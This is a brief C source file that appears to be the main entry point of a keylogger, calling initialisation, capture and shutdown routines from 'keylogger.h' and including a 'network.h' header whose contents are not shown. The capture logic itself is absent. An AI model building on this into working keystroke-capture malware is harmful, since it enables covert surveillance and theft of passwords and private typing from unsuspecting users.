#include "network.h"
#include "keylogger.h"

int main(int argc, char const *argv[])
{
    keylogger_init();

    keylogger();

    keylogger_exit();

    return 0;
}
